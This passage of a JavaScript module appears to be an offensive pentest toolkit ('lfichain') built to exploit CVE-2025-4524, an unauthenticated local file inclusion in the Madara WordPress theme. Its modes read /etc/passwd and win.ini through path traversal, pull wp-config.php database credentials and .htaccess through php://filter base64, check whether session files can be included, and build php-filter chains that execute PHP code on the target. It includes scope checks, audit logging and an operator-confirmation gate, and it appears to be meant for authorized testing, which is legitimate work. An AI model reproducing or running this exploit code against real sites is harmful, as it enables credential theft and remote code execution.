      return { ok: false, reason: 'shape endpoint ' + eu.origin + ' is off-origin from --url ' + u.origin + ' -- refused (same-origin scope guard)' };
    }
    u = eu;
  }

  const scopeRes = await scopeCheck(u, opts.scope, opts.resolve || defaultResolve);
  if (!scopeRes.ok) return { ...scopeRes };

  const ghost = opts.ghost || ghostFromSettings(opts.engagement);
  const gate = await ensureGhost(ghost, u);
  if (!gate.ok) return { ok: false, reason: gate.reason, scope: scopeRes.scope, resolved: scopeRes.resolved };

  // The vault ride: auto-ride a valid clearance for the zone unless --no-ride.
  // Every mode's requests (rce-oracle's single confirmation included) carry the
  // entry's exact cookie + UA through the entry-bound transport.
  const rideRes = await resolveVaultRide(u, opts, ghost);
  if (!rideRes.ok) return { ok: false, reason: rideRes.reason, scope: scopeRes.scope, resolved: scopeRes.resolved };

  const requester = opts.requester || defaultRequester(ghost, { timeoutMs: opts.timeoutMs, ride: rideRes.ride });
  const paceMs = Math.max(0, Number(opts.paceMs != null ? opts.paceMs : DEFAULT_PACE) || 0);
  let used = 0, lastStart = 0;
  const send = async (value) => {
    const wait = lastStart ? paceMs - (Date.now() - lastStart) : 0;
    if (wait > 0) await sleep(wait);
    lastStart = Date.now();
    used++;
    return requester(buildRequest(shaped.profile, u, value));
  };
  return { ok: true, u, profile: shaped.profile, scope: scopeRes, gate, ride: rideRes.ride, rideGap: rideRes.gap || null, send, requests: () => used, paceMs };
}

// Run-frame for one mode: audit exactly once, never throw.
function modeFrame(mode, url, opts, extraAudit) {
  const auditSink = opts.audit === false ? null : (typeof opts.audit === 'function' ? opts.audit : defaultAudit);
  return (report) => {
    if (auditSink) {
      try {
        auditSink({
          ts: new Date().toISOString(), tool: 'lfichain', mode, url: String(url || ''),
          ok: !!report.ok, requests: report.requests || 0, ...(typeof extraAudit === 'function' ? extraAudit(report) : {}),
        });
      } catch { /* audit tap must never break the tool */ }
    }
    return report;
  };
}

// A short evidence snippet around a marker hit (never more than 90 chars).
function snippetAround(body, re) {
  const m = re.exec(body);
  if (!m) return null;
  const start = Math.max(0, m.index - 20);
  return body.slice(start, m.index + m[0].length + 40).replace(/\s+/g, ' ').slice(0, 90);
}

// ---------------------------------------------------------------------------
// Mode: probe -- the capability matrix.
// ---------------------------------------------------------------------------
const PROBE_MARKERS = [
  { name: 'unix-passwd', path: 'etc/passwd', re: /root:x:0:0:/ },
  { name: 'win-ini', path: 'Windows/win.ini', re: /\[fonts\]/i },
];
const WPCONFIG_RE = /DB_(NAME|USER|PASSWORD)/;

export async function probeLfi(url, opts = {}) {
  const finish = modeFrame('probe', url, opts, (r) => ({ traversal: !!(r.capability && r.capability.traversal), wrappers: !!(r.capability && r.capability.wrappers) }));
  const gaps = [];
  try {
    const ctx = await prepare(url, opts, 'probe');
    if (!ctx.ok) return finish({ ok: false, reason: ctx.reason, scope: ctx.scope, gaps, at: new Date().toISOString() });
    const { profile } = ctx;
    if (ctx.rideGap) gaps.push(ctx.rideGap);
    if (profile.fromWafbypass) gaps.push('wafbypass style applied to paths; the php://filter scheme prefix is sent unstyled -- if the WAF signs wrapper URIs, re-run wafbypass with a wrapper base payload (unobserved, not absent)');

    const probes = [];
    const record = (name, value, res, hit, evidence) => {
      probes.push({ name, value, status: Number(res && res.status) || 0, hit: !!hit, ...(evidence ? { evidence } : {}), ...(res && res.error ? { error: res.error } : {}) });
    };

    // 1) Direct traversal with benign markers.
    const direct = {};
    for (const mk of PROBE_MARKERS) {
      const value = resourceFor(profile, mk.path);
      const res = await ctx.send(value);
      const hit = res.status > 0 && res.status < 400 && mk.re.test(res.body || '');
      direct[mk.name] = hit;
      record('direct:' + mk.name, value, res, hit, hit ? snippetAround(res.body, mk.re) : null);
    }

    // 2) Wrapper support: same file through php://filter base64.
    const wrapValue = wrapperFor(profile, 'etc/passwd');
    const wrapRes = await ctx.send(wrapValue);
    const wrapPick = selectDecoded(extractB64Candidates(wrapRes.body || ''), { markerRe: PROBE_MARKERS[0].re });
    const wrapperHit = !!wrapPick;
    record('wrapper:unix-passwd', wrapValue, wrapRes, wrapperHit, wrapperHit ? 'base64 blob at offset ' + wrapPick.offset + ' decodes to the /etc/passwd marker' : null);

    // 3) Suffix discrimination: 'wp-config' vs 'wp-config.php' through the wrapper.
    //    include($x . '.php') makes the extension-less form of an EXISTING .php
    //    file resolve and the literal form miss; no suffix inverts that.
    const suffixProbe = async (path) => {
      const v = wrapperFor(profile, path);
      const r = await ctx.send(v);
      const pick = selectDecoded(extractB64Candidates(r.body || ''), { markerRe: WPCONFIG_RE });
      record('wrapper:' + path, v, r, !!pick, pick ? 'base64 blob decodes to wp-config markers' : null);
      return !!pick;
    };
    const B = await suffixProbe('wp-config');
    const C = await suffixProbe('wp-config.php');

    const A = wrapperHit;
    let suffixConstraint;
    if (A) suffixConstraint = 'none-observed: extension-less system files are readable through the wrapper -- the include resolves arbitrary paths';
    else if (B && !C) suffixConstraint = 'appends-.php (inferred): the extension-less name of an existing .php file resolves but literal paths do not -- the include likely appends .php; system-file reads are blocked (null-byte truncation is dead since PHP 5.3.4)';
    else if (!B && C) suffixConstraint = 'exact-path (inferred): only literal existing paths resolve -- no appended suffix';
    else if (B && C) suffixConstraint = 'unconstrained-or-mixed (inferred): both extension forms resolve -- manual verification advised';
    else suffixConstraint = 'unknown: no wrapper probe resolved -- wp-config may be unreadable, absent, or the traversal depth is wrong (unobserved, not absent)';

    if (!direct['win-ini']) gaps.push('Windows marker unobserved -- expected on a Linux target; win.ini probing matters only for Windows hosts (unobserved, not absent)');
    if (!A && suffixConstraint.startsWith('unknown')) gaps.push('wrapper resolution could not be established -- traversal depth, WAF interference on php:// URIs, or include_path restrictions are all consistent with this (unobserved, not absent)');

    const capability = {
      cve: CVE_ID,
      traversal: !!(direct['unix-passwd'] || direct['win-ini']),
      wrappers: A || B || C,
      suffixConstraint,
      notes: [
        A ? 'php://filter/convert.base64-encode executed: server-side wrapper support CONFIRMED by decoded marker' : 'php://filter wrapper support NOT confirmed on /etc/passwd',
        direct['unix-passwd'] ? 'traversal CONFIRMED: /etc/passwd marker served inline' : 'direct traversal of /etc/passwd not observed',
      ],
    };
    return finish({
      ok: true, tool: 'lfichain', mode: 'probe', url: ctx.u.href,
      profile: { name: profile.name, param: profile.param, method: profile.method, paramMode: profile.paramMode, bodyKind: profile.bodyKind, fromWafbypass: profile.fromWafbypass || null },
      capability, probes,
      requests: ctx.requests(), paceMs: ctx.paceMs,
      scope: { cidrs: ctx.scope.scope, resolved: ctx.scope.resolved },
      transport: ctx.ride ? ctx.ride.transport : ctx.gate.transport,
      ride: rideReport(ctx.ride), gaps,
      note: 'capabilities are marker-verified on THIS target at THIS time; unobserved is not absent. Read-only reconnaissance: no payload content was executed or injected.',
      at: new Date().toISOString(),
    });
  } catch (e) {
    return finish({ ok: false, reason: 'lfichain probe failed: ' + msg(e), gaps, at: new Date().toISOString() });
  }
}

// The cvepack seam: a capability matrix -> a vulncheck-shaped finding. A pack
// entry for CVE-2025-4524 fires 'firm' on a version match; probeLfi upgrades it
// to evidence-backed 'confirmed' only when traversal actually executed.
export function capabilityToFinding(capability, url) {
  if (!capability || !capability.traversal) return null;
  return {
    id: 'cve-' + CVE_ID.toLowerCase(),
    cve: CVE_ID,
    title: CVE_ID + ' -- unauthenticated Madara LFI CONFIRMED by marker traversal (' + (capability.wrappers ? 'wrapper exfil available' : 'direct read only') + ')',
    sev: 'critical',
    path: String(url || ''),
    evidence: capability.notes.join(' | '),
    confidence: 'confirmed',
    suffixConstraint: capability.suffixConstraint,
  };
}

// ---------------------------------------------------------------------------
// Mode: read -- php://filter base64 exfiltration. OPSEC DISCIPLINE: decoded
// content is written to the evidence dir; the report carries {path, sha256,
// size, evidenceFile} ONLY. Contents never touch the console, the audit line,
// or the returned object.
// ---------------------------------------------------------------------------
export const DEFAULT_READ_PATHS = ['wp-config.php', '../wp-config.php', '.htaccess', 'index.php'];

const READ_MARKERS = [
  { re: /DB_(NAME|USER|PASSWORD)/, match: (p) => /wp-config\.php$/.test(p) },
  { re: /(RewriteEngine|Require all|Deny from|mod_rewrite)/i, match: (p) => /\.htaccess$/.test(p) },
  { re: /<\?php/, match: (p) => /\.php$/.test(p) },
];

const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');
const safeName = (p) => basename(String(p)).replace(/[^A-Za-z0-9._-]/g, '_') || 'blob';

function defaultEvidenceWriter(evidenceDir) {
  return async (path, buf) => {
    const hash = sha256(buf);
    const file = join(evidenceDir, hash.slice(0, 16) + '-' + safeName(path));
    mkdirSync(dirname(file), { recursive: true });
    writeFileSync(file, buf);
    return { evidenceFile: file, sha256: hash };
  };
}

export async function lfiRead(url, opts = {}) {
  const finish = modeFrame('read', url, opts, (r) => ({ read: (r.results || []).filter((x) => x.ok).length }));
  const gaps = [];
  try {
    const paths = (Array.isArray(opts.paths) && opts.paths.length ? opts.paths : DEFAULT_READ_PATHS).map(String);
    const evidenceDir = String(opts.evidenceDir || './evidence-lfichain/');
    const writeEvidence = opts.writeEvidence || defaultEvidenceWriter(evidenceDir);

    const ctx = await prepare(url, opts, 'read');
    if (!ctx.ok) return finish({ ok: false, reason: ctx.reason, scope: ctx.scope, gaps, at: new Date().toISOString() });
    const { profile } = ctx;
    if (ctx.rideGap) gaps.push(ctx.rideGap);
    if (profile.fromWafbypass) gaps.push('wafbypass style applied to paths; the php://filter scheme prefix is sent unstyled (unobserved, not absent)');

    const results = [];
    for (const path of paths) {
      const value = wrapperFor(profile, path);
      const res = await ctx.send(value);
      const marker = READ_MARKERS.find((m) => m.match(path));
      const pick = selectDecoded(extractB64Candidates(res.body || ''), { markerRe: marker && marker.re });
      if (!pick) {
        results.push({ path, ok: false, reason: 'no printable base64 blob in the response (status ' + (Number(res.status) || 0) + (res.error ? ', ' + res.error : '') + ') -- unobserved, not absent' });
        continue;
      }
      const markerHit = marker ? marker.re.test(pick.bytes.toString('latin1')) : null;
      const stored = await writeEvidence(path, pick.bytes);
      results.push({
        path, ok: true,
        sha256: stored.sha256, size: pick.bytes.length, evidenceFile: stored.evidenceFile,
        markerHint: markerHit,
        note: markerHit === false ? 'content lacks the expected marker for this path -- may be a decoy/error page; verify offline against the evidence file' : 'decoded content stored; verify offline against the evidence file',
      });
    }
    const readOk = results.filter((r) => r.ok).length;
    if (!readOk) gaps.push('no candidate path exfiltrated -- wrapper support unconfirmed or every path unreadable (unobserved, not absent)');
    return finish({
      ok: readOk > 0, tool: 'lfichain', mode: 'read', url: ctx.u.href,
      results, requests: ctx.requests(), paceMs: ctx.paceMs,
      scope: { cidrs: ctx.scope.scope, resolved: ctx.scope.resolved },
      transport: ctx.ride ? ctx.ride.transport : ctx.gate.transport,
      ride: rideReport(ctx.ride), gaps,
      note: 'OPSEC: decoded contents were written to the evidence dir ONLY -- never logged or printed. Read-only reconnaissance.',
      at: new Date().toISOString(),
    });
  } catch (e) {
    return finish({ ok: false, reason: 'lfichain read failed: ' + msg(e), gaps, at: new Date().toISOString() });
  }
}

// ---------------------------------------------------------------------------
// Mode: rce-oracle -- wrapwrap-style php-filter-chain RCE, HITL-GATED.
//
// Methodology (read -> plan -> confirm):
//   1. READ the target resource's content through the confirmed wrapper (the
//      chain planner works offline against the REAL bytes, not guesses).
//   2. PLAN: the deterministic best-first planner (planForgeChain) searches the
//      restricted, Node-emulatable move set for a chain that transforms the
//      resource into a stream BEGINNING with the payload. Emulation predicts;
//      it never claims.
//   3. CONFIRM: fire the built chain ONCE. RCE is reported ONLY when the
//      payload's statically-derived execution marker is observed in the
//      response. Emulator/PHP divergence surfaces here as an honest miss.
//
// HITL GATE (non-negotiable): without opts.operatorConfirm === true the mode
// refuses with the doctrine explanation AND records the refusal in the audit
// line. This is a capability for authorized engagements: the operator's
// explicit confirmation is part of the precondition set, like scope and ghost.
// ---------------------------------------------------------------------------
export const RCE_REFUSAL = 'rce-oracle executes a PHP payload on the target through the include. It requires explicit operator confirmation (--operator-confirm) under the signed engagement scope, every run is audit-lined, and the default payload is a harmless echo marker. Refusing without it (fail-closed; HITL gate).';

export async function rceOracle(url, opts = {}) {
  const finish = modeFrame('rce-oracle', url, opts, (r) => ({ decision: r.decision || (r.confirmed ? 'confirmed' : 'not-confirmed'), operatorConfirm: !!opts.operatorConfirm }));
  const gaps = [];
  const at0 = new Date().toISOString();
  try {
    // HITL gate first -- before scope, egress, or any request.
    if (opts.operatorConfirm !== true) {
      return finish({ ok: false, reason: RCE_REFUSAL, decision: 'refused', gaps, at: at0 });
    }

    const payload = opts.payload != null ? String(opts.payload) : DEFAULT_PAYLOAD;
    if (Buffer.from(payload, 'utf8').length > 96) {
      return finish({ ok: false, reason: 'payload exceeds 96 bytes -- chain length grows with payload size (restricted move set); keep payloads short', decision: 'refused', gaps, at: at0 });
    }
    if (!/[A-Za-z0-9+/=]/.test(payload) || /[^\x20-\x7E\t]/.test(payload)) {
      return finish({ ok: false, reason: 'payload must be printable ASCII -- non-ASCII payloads leave the emulated charset domain (fail-closed)', decision: 'refused', gaps, at: at0 });
    }
    const marker = markerFromPayload(payload);
    if (!marker) {
      return finish({ ok: false, reason: "the oracle needs a statically predictable marker: payload must contain echo '<MARKER>' (4-64 chars, no quotes/newlines). No predicted marker, no oracle, no claim.", decision: 'refused', gaps, at: at0 });
    }

    const ctx = await prepare(url, opts, 'rce-oracle');
    if (!ctx.ok) return finish({ ok: false, reason: ctx.reason, scope: ctx.scope, gaps, at: at0 });
    const { profile } = ctx;
    if (ctx.rideGap) gaps.push(ctx.rideGap);

    // Step 1: read the resource content through the wrapper (offline planning input).
    const resource = String(opts.resource || '/etc/passwd');
    const readValue = wrapperFor(profile, resource);
    const readRes = await ctx.send(readValue);
    const pick = selectDecoded(extractB64Candidates(readRes.body || ''), {});
    if (!pick) {
      return finish({
        ok: false, reason: 'could not read the resource content through the wrapper -- the chain planner needs the real bytes to plan against (status ' + (Number(readRes.status) || 0) + '). Confirm wrapper support with probe first.',
        decision: 'not-confirmed', requests: ctx.requests(), gaps, at: new Date().toISOString(),
      });
    }
    const resourceBytes = pick.bytes;

    // Step 2: plan offline (emulated; deterministic).
    const plan = planForgeChain({ resource: resourceBytes, payload, maxSteps: opts.maxSteps, beam: opts.beam, maxStates: opts.maxStates, maxStateBytes: opts.maxStateBytes });
    if (!plan.ok) {
      return finish({
        ok: false, reason: 'chain planner: ' + plan.reason,
        decision: 'not-confirmed', resource, explored: plan.explored, requests: ctx.requests(),
        emulation: EMULATION_LABEL, gaps, at: new Date().toISOString(),
      });
    }

    // Step 3: oracle confirmation -- one request, marker or no claim.
    const chain = chainUri(resource, plan.steps);
    const oracleRes = await ctx.send(chain);
    const body = oracleRes.body || '';
    const hit = body.includes(marker);

    if (!hit) {
      gaps.push('the emulated chain did not produce the marker on the server -- emulator/PHP edge-semantics divergence (pending php:8-cli validation), a hardened include, or WAF interference are all consistent with this (unobserved, not absent)');
      return finish({
        ok: false, reason: 'oracle: execution marker NOT observed in the response (status ' + (Number(oracleRes.status) || 0) + ') -- no RCE claim',
        decision: 'not-confirmed', resource, chain, steps: plan.steps, explored: plan.explored,
        requests: ctx.requests(), emulation: EMULATION_LABEL, gaps, at: new Date().toISOString(),
      });
    }

    return finish({
      ok: true, confirmed: true, tool: 'lfichain', mode: 'rce-oracle', url: ctx.u.href,
      resource, chain, steps: plan.steps, explored: plan.explored,
      marker, evidence: 'execution marker observed in the response body',
      payloadSha256: sha256(Buffer.from(payload, 'utf8')),
      requests: ctx.requests(), paceMs: ctx.paceMs,
      scope: { cidrs: ctx.scope.scope, resolved: ctx.scope.resolved },
      transport: ctx.ride ? ctx.ride.transport : ctx.gate.transport,
      ride: rideReport(ctx.ride),
      emulation: EMULATION_LABEL,
      gaps,
      note: 'RCE confirmed by observed execution marker on THIS target at THIS time. Chain semantics are Node-emulated (utf-8/utf-16le/utf-16be + base64); PHP ground-truth validation of the emulated edge cases is PENDING. Default payload is a harmless echo marker.',
      at: new Date().toISOString(),
    });
  } catch (e) {
    return finish({ ok: false, reason: 'lfichain rce-oracle failed: ' + msg(e), gaps, at: at0 });
  }
}

export const EMULATION_LABEL = 'node-emulator (base64 + TextDecoder utf-8/utf-16le/utf-16be, fatal); restricted charset set -- longer chains, reduced reach vs full wrapwrap (~15 iconv charsets); PHP ground-truth validation PENDING';

// ---------------------------------------------------------------------------
// Mode: sesscheck -- session-file inclusion feasibility (detection only).
// PHP session files serialize as key|type:value; a wrapper read that decodes to
// that shape proves the file is includable. NO payload injection, no fixation.
// ---------------------------------------------------------------------------
export const SESSION_PATHS = (id) => ['/tmp/sess_' + id, '/var/lib/php/sessions/sess_' + id];
const SESSION_RE = /\w+\|(?:i:\d+;|s:\d+:"|b:[01];|d:[0-9.E+-]+;|a:\d+:\{|N;)/;
const SESSION_ID_RE = /^[A-Za-z0-9,-]{1,128}$/;

export async function sessCheck(url, opts = {}) {
  const finish = modeFrame('sesscheck', url, opts, (r) => ({ feasible: !!r.feasible }));
  const gaps = [];
  try {
    const id = String(opts.sessionId || '');
    if (!SESSION_ID_RE.test(id)) {
      return finish({ ok: false, reason: 'malformed PHPSESSID -- expected [A-Za-z0-9,-]{1,128}; refusing to put anything else on the wire (fail-closed)', gaps, at: new Date().toISOString() });
    }
    const ctx = await prepare(url, opts, 'sesscheck');
    if (!ctx.ok) return finish({ ok: false, reason: ctx.reason, scope: ctx.scope, gaps, at: new Date().toISOString() });
    const { profile } = ctx;
    if (ctx.rideGap) gaps.push(ctx.rideGap);

    const results = [];
    for (const path of SESSION_PATHS(id)) {
      const value = wrapperFor(profile, path);
      const res = await ctx.send(value);
      const pick = selectDecoded(extractB64Candidates(res.body || ''), { markerRe: SESSION_RE });
      results.push({
        path, included: !!pick, status: Number(res.status) || 0,
        ...(pick ? { evidence: 'base64 blob at offset ' + pick.offset + ' decodes to PHP session serialization (key|type:value)' } : {}),
        ...(res.error ? { error: res.error } : {}),
      });
    }
    const feasible = results.some((r) => r.included);
    if (!feasible) gaps.push('no session file resolved at the standard paths -- custom session.save_path, open_basedir, or a suffix-appending include are all consistent with this (unobserved, not absent)');
    return finish({
      ok: true, tool: 'lfichain', mode: 'sesscheck', url: ctx.u.href,
      sessionId: id.slice(0, 4) + '...' + id.slice(-4), // masked: the id is a live credential
      feasible, results, requests: ctx.requests(), paceMs: ctx.paceMs,
      scope: { cidrs: ctx.scope.scope, resolved: ctx.scope.resolved },
      transport: ctx.ride ? ctx.ride.transport : ctx.gate.transport,
      ride: rideReport(ctx.ride), gaps,
      note: 'detection/feasibility only -- session CONTENT was matched against the serialization shape, never printed; no payload injected, no fixation attempted. Inclusion feasibility says the path resolves; what an attacker could plant in it is a separate, gated question.',
      at: new Date().toISOString(),
    });
  } catch (e) {
    return finish({ ok: false, reason: 'lfichain sesscheck failed: ' + msg(e), gaps, at: new Date().toISOString() });
  }
}

// ---------------------------------------------------------------------------
// CLI surface (registered by the orchestrator in tools/cli.mjs):
//   lfichain probe --url <u> --scope <cidrCsv> [--param template] [--action madara_load_more]
//             [--shape '<json>' | --shape-file <f.json>] [--pace 1200] [--no-ride]
//   lfichain read --url <u> --scope <cidrCsv> [--paths a,b,c] [--evidence-dir ./evidence-lfichain/] [--no-ride]
//   lfichain rce-oracle --url <u> --scope <cidrCsv> --operator-confirm [--resource /etc/passwd] [--payload "<?php echo 'X'; ?>"] [--no-ride]
//   lfichain sesscheck --url <u> --scope <cidrCsv> --session-id <PHPSESSID> [--no-ride]
// ---------------------------------------------------------------------------
export const LFICHAIN_USAGE = "lfichain <probe|read|rce-oracle|sesscheck> --url <u> --scope <cidrCsv> [--param p] [--action a] [--shape '<json>'|--shape-file f] [--paths csv] [--evidence-dir d] [--session-id id] [--resource p] [--payload php] [--pace ms] [--engagement id] [--no-ride] --operator-confirm(rce-oracle only) -- LFI toolkit for the CVE-2025-4524 class (marker-verified, ghost-ridden, scope-gated, read-only-first; auto-rides a valid vault clearance for the zone -- --no-ride forces cookieless)";

export async function cli(args, deps = {}) {
  const { readFileSync } = await import('node:fs');
  const a = Array.isArray(args) ? args.slice() : String(args || '').split(/\s+/).filter(Boolean);
  const sub = a[0] && !a[0].startsWith('--') ? a.shift() : null;
  const flag = (name) => {
    const i = a.indexOf('--' + name);
    return i >= 0 && i + 1 < a.length ? a[i + 1] : null;
  };
  const opts = { ...deps };
  opts.param = flag('param') || undefined;
  opts.action = flag('action') || undefined;
  opts.scope = flag('scope') || undefined;
  opts.engagement = flag('engagement') || undefined;
  opts.evidenceDir = flag('evidence-dir') || undefined;
  opts.sessionId = flag('session-id') || undefined;
  opts.resource = flag('resource') || undefined;
  opts.payload = flag('payload') || undefined;
  opts.endpointUrl = flag('endpoint-url') || undefined;
  if (flag('pace') != null) opts.paceMs = Number(flag('pace'));
  if (flag('timeout') != null) opts.timeoutMs = Number(flag('timeout'));
  if (flag('paths') != null) opts.paths = String(flag('paths')).split(',').map((s) => s.trim()).filter(Boolean);
  if (flag('max-states') != null) opts.maxStates = Number(flag('max-states'));
  opts.operatorConfirm = a.includes('--operator-confirm');
  if (a.includes('--no-ride')) opts.ride = false;

  const shapeInline = flag('shape');
  const shapeFile = flag('shape-file');
  if (shapeFile) {
    try { opts.shape = readFileSync(shapeFile, 'utf8'); } catch (e) { return { ok: false, reason: 'could not read --shape-file ' + shapeFile + ': ' + msg(e) }; }
  } else if (shapeInline) {
    opts.shape = shapeInline;
  }

  const url = flag('url') || a[0];
  if (!url) return { ok: false, reason: 'lfichain needs --url <endpoint> (e.g. https://target/wp-admin/admin-ajax.php)', usage: LFICHAIN_USAGE };
  switch (sub) {
    case 'probe': return probeLfi(url, opts);
    case 'read': return lfiRead(url, opts);
    case 'rce-oracle': return rceOracle(url, opts);
    case 'sesscheck': return sessCheck(url, opts);
    default: return { ok: false, reason: 'lfichain needs a subcommand: probe | read | rce-oracle | sesscheck', usage: LFICHAIN_USAGE };
  }
}
